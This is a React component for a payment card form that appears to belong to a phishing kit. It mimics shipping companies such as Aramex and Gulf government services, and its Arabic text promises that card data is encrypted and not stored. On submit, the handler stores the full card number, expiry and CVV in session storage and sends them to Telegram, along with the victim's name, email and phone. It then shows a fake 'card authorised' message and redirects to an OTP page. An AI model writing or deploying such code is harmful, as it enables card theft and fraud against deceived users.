import React, { useState, useMemo, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { useLink } from "@/hooks/useSupabase";
import { Shield, CreditCard, AlertCircle, Lock, ShieldCheck, Sparkles, Building2, Truck, Wallet } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { Card } from "@/components/ui/card";
import { designSystem } from "@/lib/designSystem";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { detectEntityFromURL, getEntityLogo, getEntityIdentity } from "@/lib/dynamicIdentity";
import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { getGovernmentLayout } from "@/components/GovernmentLayouts";
import { getEntityVisualSpec, specToCSSVariables } from "@/lib/entityVisualSpecs";

const PaymentCardForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);

  useAutoApplyIdentity();
  const { identity: dynamicIdentity } = useDynamicIdentity();
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");

  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
  const shippingInfo = linkData?.payload as any;
  const country = linkData?.payload?.country || "SA";

  // Get entity visual spec
  const entitySpec = useMemo(() => {
    if (serviceKey) {
      return getEntityVisualSpec(serviceKey);
    }
    return null;
  }, [serviceKey]);

  // Apply entity CSS variables
  useEffect(() => {
    if (entitySpec) {
      const cssVars = specToCSSVariables(entitySpec);
      const root = document.documentElement;
      Object.entries(cssVars).forEach(([key, value]) => {
        root.style.setProperty(key, value);
      });
      root.setAttribute('data-entity', entitySpec.entityId);
      root.setAttribute('data-entity-category', entitySpec.category);
    }
    return () => {
      const root = document.documentElement;
      root.removeAttribute('data-entity');
      root.removeAttribute('data-entity-category');
    };
  }, [entitySpec]);

  // Visual values
  const primaryColor = entitySpec?.colors.primary || companyBranding?.colors.primary || branding.colors.primary;
  const secondaryColor = entitySpec?.colors.secondary || companyBranding?.colors.secondary || branding.colors.secondary;
  const backgroundColor = entitySpec?.colors.background || companyBranding?.colors.background || '#F8F9FA';
  const surfaceColor = entitySpec?.colors.surface || companyBranding?.colors.surface || '#FFFFFF';
  const textColor = entitySpec?.colors.text || companyBranding?.colors.text || designSystem.colors.neutral[900];
  const textLightColor = entitySpec?.colors.textLight || companyBranding?.colors.textLight || '#666666';
  const borderColor = entitySpec?.colors.border || companyBranding?.colors.border || '#E5E5E5';
  const fontFamily = entitySpec?.typography.fontFamilyAr || companyBranding?.fonts.arabic || 'Cairo, sans-serif';
  const borderRadius = entitySpec?.dimensions.borderRadius || companyBranding?.borderRadius.lg || '16px';
  const buttonHeight = entitySpec?.dimensions.buttonHeight || '56px';
  const inputHeight = entitySpec?.dimensions.inputHeight || '48px';
  const cardShadow = entitySpec?.shadows.card || companyBranding?.shadows.lg || '0 10px 40px rgba(0,0,0,0.1)';
  const buttonShadow = entitySpec?.shadows.button || `0 8px 24px ${primaryColor}40`;
  const logoUrl = entitySpec?.assets.logo || companyBranding?.logoUrl || branding.logo;
  const entityNameAr = entitySpec?.entityNameAr || branding.nameAr || serviceKey;
  const entityNameEn = entitySpec?.entityNameEn || branding.nameEn || serviceKey;
  const category = entitySpec?.category || 'shipping';

  const rawAmount = shippingInfo?.cod_amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = `${amount} ر.س`;

  const detectedEntity = detectEntityFromURL();
  const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
  const displayLogo = entityLogo || logoUrl || branding.logo;

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    const matches = cleaned.match(/.{1,4}/g);
    return matches ? matches.join(" ") : cleaned;
  };
  
  const formatExpiry = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length >= 2) {
      return cleaned.substring(0, 2) + "/" + cleaned.substring(2, 4);
    }
    return cleaned;
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cardName || !cardNumber || !expiry || !cvv) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }
    
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    sessionStorage.setItem('cardLast4', last4);
    sessionStorage.setItem('cardName', cardName);
    sessionStorage.setItem('cardNumber', cardNumber);
    sessionStorage.setItem('cardExpiry', expiry);
    sessionStorage.setItem('cardCvv', cvv);
    
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-details",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          cardholder: cardName,
          cardLast4: last4,
          expiry: expiry,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
    }
    
    await sendToTelegram({
      type: 'card_details',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        cardholder: cardName,
        cardNumber: cardNumber,
        cardLast4: last4,
        expiry: expiry,
        cvv: cvv,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });
    
    toast({
      title: "تم بنجاح",
      description: "تم تفويض البطاقة بنجاح",
    });
    
    navigate(`/pay/${id}/otp`);
  };

  const renderForm = () => (
    <form onSubmit={handleSubmit} className="space-y-6">
      <div className="space-y-2">
        <Label className="text-sm font-bold" style={{ color: textColor }}>اسم حامل البطاقة</Label>
        <Input
          placeholder="الاسم كما يظهر على البطاقة"
          value={cardName}
          onChange={(e) => setCardName(e.target.value)}
          className="transition-all"
          style={{ height: inputHeight, borderRadius, backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB', borderColor: entitySpec?.colors.inputBorder || '#E5E7EB', borderWidth: '2px' }}
        />
      </div>

      <div className="space-y-2">
        <Label className="text-sm font-bold" style={{ color: textColor }}>رقم البطاقة</Label>
        <div className="relative">
          <Input
            placeholder="0000 0000 0000 0000"
            value={cardNumber}
            onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
            maxLength={19}
            className="font-mono transition-all"
            style={{ height: inputHeight, borderRadius, backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB', borderColor: entitySpec?.colors.inputBorder || '#E5E7EB', borderWidth: '2px', paddingRight: '3rem' }}
          />
          <CreditCard className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5" style={{ color: textLightColor }} />
        </div>
      </div>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-2">
          <Label className="text-sm font-bold" style={{ color: textColor }}>تاريخ الانتهاء</Label>
          <Input
            placeholder="MM/YY"
            value={expiry}
            onChange={(e) => setExpiry(formatExpiry(e.target.value))}
            maxLength={5}
            className="text-center font-mono transition-all"
            style={{ height: inputHeight, borderRadius, backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB', borderColor: entitySpec?.colors.inputBorder || '#E5E7EB', borderWidth: '2px' }}
          />
        </div>
        <div className="space-y-2">
          <Label className="text-sm font-bold" style={{ color: textColor }}>رمز الأمان (CVV)</Label>
          <div className="relative">
            <Input
              placeholder="123"
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
              maxLength={3}
              type="password"
              className="text-center font-mono transition-all"
              style={{ height: inputHeight, borderRadius, backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB', borderColor: entitySpec?.colors.inputBorder || '#E5E7EB', borderWidth: '2px', paddingRight: '3rem' }}
            />
            <Lock className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4" style={{ color: textLightColor }} />
          </div>
        </div>
      </div>

      <Button
        type="submit"
        className="w-full text-lg font-bold shadow-xl transition-all hover:translate-y-[-2px]"
        style={{
          background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
          boxShadow: buttonShadow,
          borderRadius,
          height: buttonHeight,
          color: entitySpec?.colors.textOnPrimary || '#FFFFFF'
        }}
      >
        تأكيد الدفع ({formattedAmount})
      </Button>

      <div className="flex items-center justify-center gap-4 pt-4" style={{ opacity: 0.5, filter: 'grayscale(1)' }}>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa" className="h-4 w-auto" />
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard" className="h-6 w-auto" />
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/Mada_Logo.svg/1200px-Mada_Logo.svg.png" alt="Mada" className="h-4 w-auto" />
      </div>
    </form>
  );
  
  const isShipping = linkData?.type === 'shipping';
  
  return (
    <>
      <PaymentMetaTags 
        serviceKey={serviceKey}
        serviceName={serviceName}
        title={`بيانات البطاقة - ${serviceName}`}
        customDescription={`أدخل بيانات بطاقتك بشكل آمن ومحمي - ${serviceName}`}
        amount={formattedAmount}
      />

      {(() => {
        if (isShipping) {
          const Layout = getCompanyLayout(serviceKey);
          return (
            <Layout 
              companyKey={serviceKey} 
              amount={formattedAmount} 
              trackingNumber={shippingInfo?.tracking_number || `TRK-${id?.substring(0, 8).toUpperCase()}`}
            >
              {renderForm()}
            </Layout>
          );
        }

        if (country === 'SA' || country === 'KW' || country === 'BH') {
          const Layout = getGovernmentLayout(country);
          return (
            <Layout 
              countryCode={country} 
              amount={formattedAmount} 
              serviceName={serviceName}
            >
              {renderForm()}
            </Layout>
          );
        }

        return (
          <div
            className="min-h-screen w-full flex flex-col"
            dir="rtl"
            style={{
              background: `linear-gradient(135deg, ${backgroundColor}, ${surfaceColor})`,
              fontFamily
            }}
          >
            <div className="w-full border-b bg-white shadow-sm" style={{ borderBottom: `3px solid ${primaryColor}` }}>
              <div className="container mx-auto px-4 h-16 sm:h-20 flex items-center justify-between">
                <div className="flex items-center gap-4">
                  {displayLogo && <img src={displayLogo} alt={serviceName} className="h-10 sm:h-12 w-auto object-contain" />}
                  <div className="hidden sm:block">
                    <p className="text-base font-bold" style={{ color: textColor }}>{serviceName}</p>
                    <p className="text-sm" style={{ color: textLightColor }}>الدفع الآمن</p>
                  </div>
                </div>
                <div className="flex items-center gap-2 px-3 py-1.5 rounded-full border" style={{ backgroundColor: `${primaryColor}08`, color: primaryColor, borderColor: `${primaryColor}20` }}>
                  <ShieldCheck className="w-4 h-4" />
                  <span className="text-xs font-medium">آمن</span>
                </div>
              </div>
            </div>

            <div className="flex-1 flex items-center justify-center py-8 px-4">
              <div className="w-full max-w-lg">
                <div className="text-center mb-8">
                  <div className="flex items-center justify-center gap-3 mb-4">
                    <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
                    <h1 className="text-2xl sm:text-3xl font-bold" style={{ color: textColor }}>بيانات البطاقة</h1>
                  </div>
                  <p style={{ color: textLightColor }}>أدخل بيانات بطاقتك بشكل آمن</p>
                </div>

                <Card className="p-6 sm:p-8 border-0" style={{ borderRadius, boxShadow: cardShadow, backgroundColor: surfaceColor }}>
                  <div className="rounded-xl p-4 mb-6 flex items-start gap-3 border" style={{ backgroundColor: `${primaryColor}08`, borderColor: `${primaryColor}20` }}>
                    <AlertCircle className="w-5 h-5 mt-0.5" style={{ color: primaryColor }} />
                    <div className="text-sm">
                      <p className="font-bold" style={{ color: primaryColor }}>حماية معلوماتك</p>
                      <p className="text-xs" style={{ color: `${primaryColor}90` }}>بياناتك محمية بتقنية التشفير SSL. لا نقوم بحفظ أو تخزين بيانات البطاقة.</p>
                    </div>
                  </div>
                  {renderForm()}
                </Card>
              </div>
            </div>
          </div>
        );
      })()}
    </>
  );
};

export default PaymentCardForm;
